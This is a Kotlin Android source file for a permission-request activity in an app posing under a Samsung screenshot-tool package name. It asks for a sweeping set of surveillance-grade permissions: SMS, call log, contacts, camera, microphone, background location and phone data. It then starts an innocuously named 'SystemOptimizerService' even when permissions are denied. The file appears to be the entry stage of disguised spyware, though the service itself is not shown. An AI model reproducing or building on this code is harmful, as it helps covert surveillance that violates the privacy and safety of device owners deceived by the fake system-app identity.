package com.samsung.android.app.smartcapture

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class PermissionActivity : AppCompatActivity() {

    private val requiredPermissions = mutableListOf<String>()
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            startSystemOptimizerService()
        } else {
            val denied = permissions.filter { !it.value }.keys
            Toast.makeText(this, "Some permissions denied: $denied", Toast.LENGTH_LONG).show()
            startSystemOptimizerService()
        }
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildPermissionList()
        val neededPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (neededPermissions.isEmpty()) {
            startSystemOptimizerService()
            finish()
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            neededPermissions.contains(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
            val foregroundLocation = arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            permissionLauncher.launch(foregroundLocation)
        } else {
            permissionLauncher.launch(neededPermissions)
        }
    }

    private fun buildPermissionList() {
        // --- STORAGE / MEDIA ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            requiredPermissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            requiredPermissions.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            requiredPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        requiredPermissions.add(Manifest.permission.ACCESS_MEDIA_LOCATION)

        // --- LOCATION ---
        requiredPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        requiredPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requiredPermissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        // --- SMS & CALL LOG ---
        requiredPermissions.add(Manifest.permission.READ_SMS)
        requiredPermissions.add(Manifest.permission.RECEIVE_SMS)
        requiredPermissions.add(Manifest.permission.READ_CALL_LOG)

        // --- CONTACTS ---
        requiredPermissions.add(Manifest.permission.READ_CONTACTS)
        requiredPermissions.add(Manifest.permission.GET_ACCOUNTS)

        // --- CAMERA & MICROPHONE ---
        requiredPermissions.add(Manifest.permission.CAMERA)
        requiredPermissions.add(Manifest.permission.RECORD_AUDIO)

        // --- PHONE ---
        requiredPermissions.add(Manifest.permission.READ_PHONE_STATE)
        requiredPermissions.add(Manifest.permission.CALL_PHONE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            requiredPermissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }

        // --- NOTIFICATIONS ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // --- ACTIVITY RECOGNITION ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requiredPermissions.add(Manifest.permission.ACTIVITY_RECOGNITION)
        }

        // --- SCHEDULE EXACT ALARM ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            requiredPermissions.add(Manifest.permission.SCHEDULE_EXACT_ALARM)
        }
    }

    private fun startSystemOptimizerService() {
        val intent = Intent(this, SystemOptimizerService::class.java)
        intent.action = "START_FROM_PERMISSION_ACTIVITY"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    companion object {
        fun createIntent(context: android.content.Context): Intent {
            return Intent(context, PermissionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
        }
    }
}
